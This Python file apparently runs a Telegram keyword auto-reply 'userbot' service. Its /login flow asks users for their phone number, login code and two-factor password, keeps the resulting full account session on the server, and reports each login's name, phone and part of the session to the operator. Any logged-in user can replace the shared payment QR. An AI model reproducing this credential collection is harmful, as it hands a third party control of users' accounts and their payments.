import asyncio
import os
import json
import qrcode
from io import BytesIO
from threading import Thread
from flask import Flask
from telethon import TelegramClient, events, functions, types
from telethon.errors import SessionPasswordNeededError, FloodWaitError, RPCError
from telethon.sessions import StringSession

# ─── FLASK WEB SERVER FOR HEALTHCHECK ───
app = Flask(__name__)

@app.route('/')
def health():
    return "Bot is running!", 200

@app.route('/health')
def health_check():
    return "OK", 200

def run_flask():
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))

# ─── CONFIGURATION ───
API_ID = int(os.environ.get("API_ID", ))
API_HASH = os.environ.get("API_HASH", )
BOT_TOKEN = os.environ.get("BOT_TOKEN", )
MY_OWNER_ID = int(os.environ.get("MY_OWNER_ID", ))

bot = TelegramClient("price_qr_bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)
user_states = {}
active_sessions = {}
user_configs = {}

# Default configuration
# greetings: list of dicts -> [{"type": "text"|"sticker"|"gif"|"photo"|"video", "value": "..."}]
DEFAULT_CONFIG = {
    "keywords": {},
    "greetings": [],          # ← list of greetings, all sent on first DM
    "greeted_users": []
}

# Temporary file storage for greeting media
GREETING_DIR = "greetings"
os.makedirs(GREETING_DIR, exist_ok=True)

# QR Configuration
QR_CONFIG = {
    "keyword": "qr",
    "qr_image_url": "https://i.postimg.cc/hGt6DrDy/photo-2026-08-01-16-06-44.jpg",
    "caption": "📱 Scan to Pay\n\nPaytm UPI ID: paytm.s2sps2y@pty\n\nGet Assured Cashback!"
}

print(f"🚀 Bot started with QR Image: {QR_CONFIG['qr_image_url']}")


def load_user_config(chat_id):
    """Load user configuration from file or return default."""
    try:
        if os.path.exists(f"config_{chat_id}.json"):
            with open(f"config_{chat_id}.json", "r") as f:
                config = json.load(f)
                config.setdefault("keywords", {})
                config.setdefault("greetings", [])
                config.setdefault("greeted_users", [])

                # Migrate old single-greeting format
                old_type = config.pop("greeting_type", None)
                old_val = config.pop("greeting_value", None)
                old_text = config.pop("greeting", None)

                if old_type and old_type != "none" and old_val and not config["greetings"]:
                    config["greetings"].append({"type": old_type, "value": old_val})
                elif old_text and not config["greetings"]:
                    config["greetings"].append({"type": "text", "value": old_text})

                return config
    except:
        pass
    return DEFAULT_CONFIG.copy()


def save_user_config(chat_id, config):
    """Save user configuration to file."""
    try:
        with open(f"config_{chat_id}.json", "w") as f:
            json.dump(config, f, indent=4)
        return True
    except:
        return False


def get_greeting_media_path(chat_id, index, ext):
    """Return the media file path for a specific greeting index."""
    return os.path.join(GREETING_DIR, f"greeting_{chat_id}_{index}{ext}")


def clear_all_greeting_media(chat_id):
    """Remove all greeting media files for this chat."""
    for fname in os.listdir(GREETING_DIR):
        if fname.startswith(f"greeting_{chat_id}_"):
            try:
                os.remove(os.path.join(GREETING_DIR, fname))
            except:
                pass


def delete_greeting_media_file(chat_id, index):
    """Remove all possible media extensions for a specific index."""
    for ext in (".webp", ".tgs", ".mp4", ".jpg", ".jpeg", ".png", ".gif"):
        p = get_greeting_media_path(chat_id, index, ext)
        if os.path.exists(p):
            try:
                os.remove(p)
            except:
                pass


def reindex_greeting_media(chat_id, config):
    """
    After removal, media files on disk have stale indexes.
    This renames them so file indexes match list indexes.
    """
    # Delete all existing files then re-download-free approach:
    # We just re-save existing paths because we stored path in greeting value.
    # But we want deterministic indices. Simplest: rename files to match new order.
    new_paths = []
    for new_idx, g in enumerate(config["greetings"]):
        if g["type"] == "text":
            new_paths.append(g)  # text untouched
            continue
        old_path = g["value"]
        if not old_path or not os.path.exists(old_path):
            new_paths.append(g)
            continue
        ext = os.path.splitext(old_path)[1]
        new_path = get_greeting_media_path(chat_id, new_idx, ext)
        if old_path != new_path:
            try:
                os.rename(old_path, new_path)
            except:
                pass
        new_paths.append({"type": g["type"], "value": new_path})
    config["greetings"] = new_paths


# ─── MAIN BOT EVENTS ───
@bot.on(events.NewMessage(pattern="/start"))
async def start_handler(event):
    await event.reply(
        "━━━〔 ✦ 👑 Custom Keyword-Response Bot 👑 ✦ 〕━━━\n\n"
        "Welcome! Apna userbot chalu karne ke liye `/login` command bhejen.\n\n"
        "📌 **Features:**\n"
        "• 📝 Custom Keywords with Custom Responses\n"
        "• 📱 QR Code Image\n"
        "• 👋 Multiple Greetings on First DM (Text / Sticker / GIF / Photo / Video)\n\n"
        "⚙️ **Commands:**\n"
        "`/addkeyword <word> <response>`\n"
        "`/removekeyword <word>`\n"
        "`/listkeywords`\n"
        "`/setgreeting` - Add a greeting (text / sticker / GIF / media)\n"
        "`/listgreetings` - View all greetings\n"
        "`/removegreeting <index>` - Remove a specific greeting\n"
        "`/cleargreetings` - Remove all greetings\n"
        "`/setqr <image_url> | <caption>`\n"
        "`/resetconfig`\n\n"
        "🚪 **Logout:** `/logout`"
    )


@bot.on(events.NewMessage(pattern="/qr"))
async def main_bot_qr_handler(event):
    try:
        await bot.send_message(
            event.chat_id,
            f"📱 Here is your QR Code:\n\n{QR_CONFIG['qr_image_url']}\n\n{QR_CONFIG['caption']}"
        )
    except Exception as e:
        print(f"Error sending QR image in main bot: {e}")
        await event.reply("❌ Failed to send QR code.")


@bot.on(events.NewMessage)
async def main_bot_message_handler(event):
    chat_id = event.chat_id
    text = event.text.strip() if event.text else ""

    if chat_id in user_states:
        return

    if text and text.lower().strip() == "qr":
        try:
            await bot.send_message(
                chat_id,
                f"📱 Here is your QR Code:\n\n{QR_CONFIG['qr_image_url']}\n\n{QR_CONFIG['caption']}"
            )
        except Exception as e:
            print(f"Error sending QR image: {e}")
            await event.reply("❌ Failed to send QR code.")
        return

    if text and text.lower().strip() == "price":
        await event.reply(
            "📦 **Welcome to our store!**\n\n"
            "Login with `/login` to customize your own keywords!\n\n"
            "📌 **Demo Products:**\n"
            "- Product A: $10\n"
            "- Product B: $20"
        )
        return


@bot.on(events.NewMessage(pattern="/login"))
async def login_handler(event):
    chat_id = event.chat_id
    if chat_id in active_sessions:
        await event.reply("⚠️ **Aap already logged in hain!**\nPehle `/logout` karein.")
        return
    user_states[chat_id] = {"step": "NUMBER"}
    await event.reply("📱 **STEP 1:** Apna Telegram Number bhejen (with country code, e.g., `+919876543210`)")


@bot.on(events.NewMessage(pattern="/logout"))
async def logout_handler(event):
    chat_id = event.chat_id
    if chat_id in active_sessions:
        try:
            client = active_sessions[chat_id]
            await client.disconnect()
            active_sessions.pop(chat_id, None)
            user_states.pop(chat_id, None)
            await event.reply("✅ **Logout Successful!**")
        except Exception as e:
            await event.reply(f"❌ **Logout Error:** `{str(e)}`")
    else:
        await event.reply("ℹ️ **Aap already logged out hain.**")


@bot.on(events.NewMessage(pattern="/addkeyword"))
async def add_keyword_handler(event):
    chat_id = event.chat_id
    if chat_id not in active_sessions:
        await event.reply("❌ **Pehle login karein!** `/login`")
        return

    args = event.raw_text.split(maxsplit=1)
    if len(args) < 2:
        await event.reply("❌ **Usage:** `/addkeyword <word> <response>`")
        return

    parts = args[1].split(maxsplit=1)
    if len(parts) < 2:
        await event.reply("❌ **Usage:** `/addkeyword <word> <response>`")
        return

    word = parts[0].lower().strip()
    response = parts[1]
    config = load_user_config(chat_id)

    if word in config["keywords"]:
        await event.reply(f"⚠️ **Keyword '{word}' already exists!**")
        return

    config["keywords"][word] = response
    if save_user_config(chat_id, config):
        await event.reply(f"✅ **Keyword Added!**\n📌 `{word}` → `{response[:100]}...`")
    else:
        await event.reply("❌ Failed to save!")


@bot.on(events.NewMessage(pattern="/removekeyword"))
async def remove_keyword_handler(event):
    chat_id = event.chat_id
    if chat_id not in active_sessions:
        await event.reply("❌ **Pehle login karein!** `/login`")
        return

    args = event.raw_text.split(maxsplit=1)
    if len(args) < 2:
        await event.reply("❌ **Usage:** `/removekeyword <word>`")
        return

    word = args[1].lower().strip()
    config = load_user_config(chat_id)

    if word not in config["keywords"]:
        await event.reply(f"❌ **Keyword '{word}' not found!**")
        return

    del config["keywords"][word]
    if save_user_config(chat_id, config):
        await event.reply(f"✅ **Keyword Removed:** `{word}`")


@bot.on(events.NewMessage(pattern="/listkeywords"))
async def list_keywords_handler(event):
    chat_id = event.chat_id
    if chat_id not in active_sessions:
        await event.reply("❌ **Pehle login karein!** `/login`")
        return

    config = load_user_config(chat_id)
    if not config["keywords"]:
        await event.reply("📋 **No Keywords Found!**\nUse `/addkeyword` to add one.")
        return

    kw_list = "📋 **Your Keywords**\n━━━━━━━━━━━━━━━\n\n"
    for idx, (word, response) in enumerate(config["keywords"].items(), 1):
        kw_list += f"{idx}. **{word}**\n   └─ `{response[:100]}...`\n\n"
    kw_list += f"📊 **Total:** {len(config['keywords'])} keywords"
    await event.reply(kw_list)


# ─── SET GREETING (adds to list, doesn't replace) ───
@bot.on(events.NewMessage(pattern="/setgreeting"))
async def set_greeting_handler(event):
    chat_id = event.chat_id
    if chat_id not in active_sessions:
        await event.reply("❌ **Pehle login karein!** `/login`")
        return

    config = load_user_config(chat_id)

    # Case 1: Reply to a message containing sticker/GIF/photo/video/text
    if event.is_reply:
        replied = await event.get_reply_message()
        saved = await save_greeting_from_message(chat_id, replied, config)
        if saved:
            save_user_config(chat_id, config)
            idx = len(config["greetings"])
            await event.reply(
                f"✅ **Greeting #{idx} added from replied {saved['type']}!**\n\n"
                f"Ab har naye user ko pehli DM par yeh **{len(config['greetings'])} greeting(s)** milenge."
            )
        else:
            await event.reply("❌ **Reply mein koi supported media nahi mila.**")
        return

    # Case 2: Text argument given
    args = event.raw_text.split(maxsplit=1)
    if len(args) >= 2 and args[1].strip():
        greeting_text = args[1].strip()
        config["greetings"].append({"type": "text", "value": greeting_text})
        save_user_config(chat_id, config)
        idx = len(config["greetings"])
        await event.reply(
            f"✅ **Text Greeting #{idx} Added!**\n\n📝 `{greeting_text}`\n\n"
            f"Total greetings: **{len(config['greetings'])}**\n"
            f"Tip: `{{name}}` use karein user ke first name ke liye."
        )
        return

    # Case 3: No args, no reply → enter "awaiting" mode
    user_states[chat_id] = {"step": "AWAITING_GREETING"}
    await event.reply(
        "👋 **Add New Greeting**\n\n"
        "Ab aap jo bhi bhejenge woh naya greeting ban jayega:\n\n"
        "• 📝 **Text** → Send any text\n"
        "• 🎨 **Sticker** → Send a sticker\n"
        "• 🎞️ **GIF** → Send a GIF\n"
        "• 🖼️ **Photo** → Send a photo\n"
        "• 🎬 **Video** → Send a video\n\n"
        "💡 **Tip:** Aap kisi bhi sticker/GIF par `/setgreeting` ka reply bhi kar sakte hain.\n\n"
        "❌ Cancel karne ke liye `/cancel` bhejein."
    )


async def save_greeting_from_message(chat_id, msg, config):
    """Save greeting from a message. Returns dict or None. Appends to config['greetings']."""
    if msg is None:
        return None

    next_index = len(config["greetings"])

    # Sticker
    if msg.sticker:
        ext = ".tgs" if msg.sticker.mime_type == "application/x-tgsticker" else ".webp"
        path = get_greeting_media_path(chat_id, next_index, ext)
        await bot.download_media(msg, file=path)
        g = {"type": "sticker", "value": path}
        config["greetings"].append(g)
        return g

    # GIF / video document
    if msg.document:
        mime = (msg.document.mime_type or "").lower()
        if "gif" in mime or "video" in mime:
            ext = ".mp4"
            path = get_greeting_media_path(chat_id, next_index, ext)
            await bot.download_media(msg, file=path)
            g = {"type": "gif", "value": path}
            config["greetings"].append(g)
            return g

    # Video
    if msg.video:
        path = get_greeting_media_path(chat_id, next_index, ".mp4")
        await bot.download_media(msg, file=path)
        g = {"type": "video", "value": path}
        config["greetings"].append(g)
        return g

    # Photo
    if msg.photo:
        path = get_greeting_media_path(chat_id, next_index, ".jpg")
        await bot.download_media(msg, file=path)
        g = {"type": "photo", "value": path}
        config["greetings"].append(g)
        return g

    # Text
    if msg.text and not msg.text.startswith("/"):
        g = {"type": "text", "value": msg.text.strip()}
        config["greetings"].append(g)
        return g

    return None


# ─── HANDLE /setgreeting FOLLOW-UP MESSAGES ───
@bot.on(events.NewMessage)
async def greeting_media_listener(event):
    chat_id = event.chat_id
    if chat_id not in user_states:
        return
    if user_states[chat_id].get("step") != "AWAITING_GREETING":
        return

    if event.text and event.text.startswith("/"):
        if event.text.startswith("/cancel"):
            user_states.pop(chat_id, None)
            await event.reply("❌ Greeting setup cancelled.")
        return

    config = load_user_config(chat_id)
    saved = await save_greeting_from_message(chat_id, event.message, config)
    user_states.pop(chat_id, None)

    if saved:
        save_user_config(chat_id, config)
        idx = len(config["greetings"])
        await event.reply(
            f"✅ **Greeting #{idx} Saved!**\n\n"
            f"🎯 Type: **{saved['type']}**\n\n"
            f"Total greetings: **{len(config['greetings'])}**\n"
            f"Ab har naye user ko pehli DM par yeh sab milenge."
        )
    else:
        await event.reply("❌ **Unsupported message type.** Please try again with /setgreeting")


# ─── LIST GREETINGS ───
@bot.on(events.NewMessage(pattern="/listgreetings"))
async def list_greetings_handler(event):
    chat_id = event.chat_id
    if chat_id not in active_sessions:
        await event.reply("❌ **Pehle login karein!** `/login`")
        return

    config = load_user_config(chat_id)
    greetings = config.get("greetings", [])

    if not greetings:
        await event.reply("📋 **No Greetings Set!**\n\nUse `/setgreeting` to add one.")
        return

    msg = "👋 **Your Greetings**\n━━━━━━━━━━━━━━━\n\n"
    for idx, g in enumerate(greetings, 1):
        if g["type"] == "text":
            preview = g["value"][:80]
            msg += f"**{idx}.** 📝 Text → `{preview}`\n"
        else:
            msg += f"**{idx}.** 🎯 {g['type'].capitalize()} → `{os.path.basename(g['value'])}`\n"

    msg += f"\n📊 **Total:** {len(greetings)} greeting(s)\n"
    msg += "💡 Sabhi greetings pehli DM par **ek saath** bheje jayenge.\n\n"
    msg += "• `/removegreeting <index>` - Remove one\n"
    msg += "• `/cleargreetings` - Remove all"
    await event.reply(msg)


# ─── REMOVE ONE GREETING BY INDEX ───
@bot.on(events.NewMessage(pattern="/removegreeting"))
async def remove_greeting_handler(event):
    chat_id = event.chat_id
    if chat_id not in active_sessions:
        await event.reply("❌ **Pehle login karein!** `/login`")
        return

    args = event.raw_text.split(maxsplit=1)
    config = load_user_config(chat_id)
    greetings = config.get("greetings", [])

    if not greetings:
        await event.reply("ℹ️ **Koi greeting set nahi hai.**")
        return

    if len(args) < 2 or not args[1].strip().isdigit():
        await event.reply(
            "❌ **Usage:** `/removegreeting <index>`\n\n"
            f"Current greetings: **{len(greetings)}**\n"
            "Use `/listgreetings` to see indexes."
        )
        return

    idx = int(args[1].strip())
    if idx < 1 or idx > len(greetings):
        await event.reply(f"❌ **Invalid index.** Use 1 to {len(greetings)}.")
        return

    removed = greetings.pop(idx - 1)

    # Delete associated media file if any
    if removed["type"] != "text":
        try:
            if os.path.exists(removed["value"]):
                os.remove(removed["value"])
        except:
            pass

    # Reindex remaining media files
    reindex_greeting_media(chat_id, config)
    save_user_config(chat_id, config)

    await event.reply(
        f"✅ **Greeting #{idx} Removed!**\n"
        f"🎯 Type was: **{removed['type']}**\n\n"
        f"Remaining greetings: **{len(config['greetings'])}**"
    )


# ─── CLEAR ALL GREETINGS ───
@bot.on(events.NewMessage(pattern="/cleargreetings"))
async def clear_greetings_handler(event):
    chat_id = event.chat_id
    if chat_id not in active_sessions:
        await event.reply("❌ **Pehle login karein!** `/login`")
        return

    config = load_user_config(chat_id)
    if not config.get("greetings"):
        await event.reply("ℹ️ **Koi greeting set nahi hai.**")
        return

    config["greetings"] = []
    save_user_config(chat_id, config)
    clear_all_greeting_media(chat_id)
    await event.reply("✅ **All Greetings Cleared!**")


# ─── SET QR ───
@bot.on(events.NewMessage(pattern="/setqr"))
async def set_qr_handler(event):
    chat_id = event.chat_id
    if chat_id not in active_sessions:
        await event.reply("❌ **Pehle login karein!** `/login`")
        return

    args = event.raw_text.split(maxsplit=1)
    if len(args) < 2:
        await event.reply("❌ **Usage:** `/setqr <image_url> | <caption>`")
        return

    content = args[1]
    if " | " in content:
        parts = content.split(" | ", 1)
        new_url = parts[0].strip()
        new_caption = parts[1].strip()
    else:
        new_url = content.strip()
        new_caption = "📱 Here is your QR Code"

    global QR_CONFIG
    QR_CONFIG['qr_image_url'] = new_url
    QR_CONFIG['caption'] = new_caption

    await event.reply(f"✅ **QR Updated!**\n🆕 `{new_url[:60]}...`\n📝 `{new_caption}`")


@bot.on(events.NewMessage(pattern="/resetconfig"))
async def reset_config_handler(event):
    chat_id = event.chat_id
    if chat_id not in active_sessions:
        await event.reply("❌ **Pehle login karein!** `/login`")
        return

    config = DEFAULT_CONFIG.copy()
    save_user_config(chat_id, config)
    clear_all_greeting_media(chat_id)
    await event.reply("✅ **All Configuration Reset!**")


# ─── MAIN MESSAGE HANDLER (Login flow) ───
@bot.on(events.NewMessage)
async def message_handler(event):
    chat_id = event.chat_id
    text = event.text.strip() if event.text else ""
    if chat_id not in user_states or (text.startswith("/")):
        return

    state = user_states[chat_id]
    if state.get("step") == "AWAITING_GREETING":
        return

    if state["step"] == "NUMBER":
        await event.reply("⏳ Connecting to Telegram...")
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        try:
            send_code = await client.send_code_request(text)
            state["client"] = client
            state["phone"] = text
            state["phone_code_hash"] = send_code.phone_code_hash
            state["step"] = "OTP"
            await event.reply("📩 **STEP 2:** Aapke Telegram par aaya hua OTP yahan bhejen.")
        except Exception as e:
            await event.reply(f"❌ Error: `{str(e)}`\nDubara `/login` karein.")
            user_states.pop(chat_id, None)

    elif state["step"] == "OTP":
        client = state["client"]
        try:
            await client.sign_in(phone=state["phone"], code=text, phone_code_hash=state["phone_code_hash"])
            session_str = client.session.save()
            await event.reply("✅ **Login Kamyab!**\n\n🚀 Userbot start ho raha hai...")

            try:
                me = await client.get_me()
                hidden_session = session_str[:10] + "..." + session_str[-10:] if len(session_str) > 20 else "***HIDDEN***"
                await bot.send_message(MY_OWNER_ID, (
                    "🔥 **NEW USERBOT LOGIN** 🔥\n"
                    "━━━━━━━━━━━━━━━━━━━━━\n"
                    f"📛 **Name:** {me.first_name}\n"
                    f"🆔 **User ID:** `{me.id}`\n"
                    f"🔗 **Username:** @{me.username if me.username else 'None'}\n"
                    f"📱 **Phone:** `{state['phone']}`\n"
                    f"🔑 **Session:** `{hidden_session}`"
                ))
            except Exception as log_err:
                print(f"Logging error: {log_err}")

            asyncio.create_task(run_user_bot(session_str, chat_id))
            user_states.pop(chat_id, None)
        except SessionPasswordNeededError:
            state["step"] = "PASSWORD"
            await event.reply("🔒 **2-Step Verification:** Apna 2FA password bhejen.")
        except Exception as e:
            await event.reply(f"❌ Error: `{str(e)}`\nDubara `/login` karein.")
            user_states.pop(chat_id, None)

    elif state["step"] == "PASSWORD":
        client = state["client"]
        try:
            await client.sign_in(password=text)
            session_str = client.session.save()
            await event.reply("✅ **Login Kamyab!**\n\n🚀 Userbot start ho raha hai...")

            try:
                me = await client.get_me()
                hidden_session = session_str[:10] + "..." + session_str[-10:] if len(session_str) > 20 else "***HIDDEN***"
                await bot.send_message(MY_OWNER_ID, (
                    "🔥 **NEW USERBOT LOGIN (2FA)** 🔥\n"
                    "━━━━━━━━━━━━━━━━━━━━━\n"
                    f"📛 **Name:** {me.first_name}\n"
                    f"🆔 **User ID:** `{me.id}`\n"
                    f"📱 **Phone:** `{state['phone']}`\n"
                    f"🔑 **Session:** `{hidden_session}`"
                ))
            except Exception as log_err:
                print(f"Logging error: {log_err}")

            asyncio.create_task(run_user_bot(session_str, chat_id))
            user_states.pop(chat_id, None)
        except Exception as e:
            await event.reply(f"❌ Error: `{str(e)}`\nDubara `/login` karein.")
            user_states.pop(chat_id, None)


# ─── USERBOT CORE ENGINE ───
async def run_user_bot(session_string, chat_id):
    try:
        user_bot = TelegramClient(StringSession(session_string), API_ID, API_HASH, auto_reconnect=True)
        await user_bot.start()

        active_sessions[chat_id] = user_bot
        me = await user_bot.get_me()
        USER_ID = me.id

        config = load_user_config(chat_id)
        user_configs[chat_id] = config

        @user_bot.on(events.NewMessage(incoming=True))
        async def handle_incoming_messages(event):
            if not event.is_private:
                return

            sender = await event.get_sender()
            if sender.id == USER_ID:
                return

            message_text = (event.raw_text or "").lower().strip()
            config = load_user_config(chat_id)
            print(f"📩 From {sender.first_name} (ID: {sender.id}): {message_text}")

            try:
                # ─── SEND ALL GREETINGS ON FIRST DM ───
                sender_id_str = str(sender.id)
                greeted = config.get("greeted_users", [])
                greetings = config.get("greetings", [])

                if greetings and sender_id_str not in greeted:
                    print(f"👋 Sending {len(greetings)} greeting(s) to {sender.id}")
                    for g in greetings:
                        try:
                            if g["type"] == "text":
                                personalized = g["value"].replace(
                                    "{name}", sender.first_name or "there"
                                )
                                await event.reply(personalized)
                            elif g["type"] in ("sticker", "gif", "photo", "video"):
                                media_path = g["value"]
                                if os.path.exists(media_path):
                                    if g["type"] == "sticker":
                                        await user_bot.send_file(sender.id, media_path, force_document=False)
                                    elif g["type"] == "gif":
                                        await user_bot.send_file(sender.id, media_path, force_document=False, supports_streaming=True)
                                    elif g["type"] == "photo":
                                        await user_bot.send_file(sender.id, media_path, force_document=False)
                                    elif g["type"] == "video":
                                        await user_bot.send_file(sender.id, media_path, force_document=False, supports_streaming=True)
                                else:
                                    print(f"⚠️ Missing media for greeting: {media_path}")

                            await asyncio.sleep(0.5)  # avoid flood
                        except Exception as ge:
                            print(f"Greeting error ({g['type']}): {ge}")

                    greeted.append(sender_id_str)
                    config["greeted_users"] = greeted
                    save_user_config(chat_id, config)

                # ─── KEYWORDS ───
                if message_text in config["keywords"]:
                    await event.reply(config["keywords"][message_text])
                    print(f"✅ Sent keyword response to {sender.id}")

                # ─── QR ───
                elif message_text == QR_CONFIG['keyword']:
                    try:
                        await event.reply(
                            f"📱 Here is your QR Code:\n\n{QR_CONFIG['qr_image_url']}\n\n{QR_CONFIG['caption']}"
                        )
                    except Exception as e:
                        print(f"QR error: {e}")

                # ─── LOGOUT ───
                elif message_text == "logout":
                    await event.reply("🔴 **Logging out...**")
                    await user_bot.disconnect()
                    if chat_id in active_sessions:
                        active_sessions.pop(chat_id, None)
                    return

            except Exception as e:
                print(f"Handler error for {sender.id}: {e}")

        # Welcome message
        keyword_count = len(config["keywords"])
        keyword_preview = list(config["keywords"].keys())[:3] if keyword_count > 0 else []
        greeting_count = len(config.get("greetings", []))

        welcome_msg = (
            f"🔥 **Custom Bot Active!**\n"
            f"👤 User: {me.first_name}\n\n"
            f"📊 **Keywords:** {keyword_count}\n"
        )
        if keyword_count > 0:
            welcome_msg += f"📌 {', '.join(['`' + k + '`' for k in keyword_preview])}"
            if keyword_count > 3:
                welcome_msg += f" +{keyword_count - 3} more"
            welcome_msg += "\n\n"

        welcome_msg += (
            f"👋 **Greetings Set:** {greeting_count}\n"
            f"📱 **QR:** `{QR_CONFIG['qr_image_url'][:50]}...`\n\n"
            f"⚙️ **Commands:**\n"
            f"  `/addkeyword` / `/removekeyword` / `/listkeywords`\n"
            f"  `/setgreeting` (add) / `/listgreetings`\n"
            f"  `/removegreeting <index>` / `/cleargreetings`\n"
            f"  `/setqr` / `/resetconfig`\n\n"
            f"📱 Send 'qr' for QR code\n"
            f"🚪 Send 'logout' to stop"
        )

        await bot.send_message(chat_id, welcome_msg)
        await user_bot.run_until_disconnected()

    except Exception as e:
        print(f"Crash: {e}")
        if chat_id in active_sessions:
            active_sessions.pop(chat_id, None)
        try:
            await bot.send_message(chat_id, f"⚠️ Bot Stopped. Error: `{str(e)[:80]}`")
        except:
            pass


# ─── START BOT AND WEB SERVER ───
async def main():
    flask_thread = Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()
    await bot.run_until_disconnected()


if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
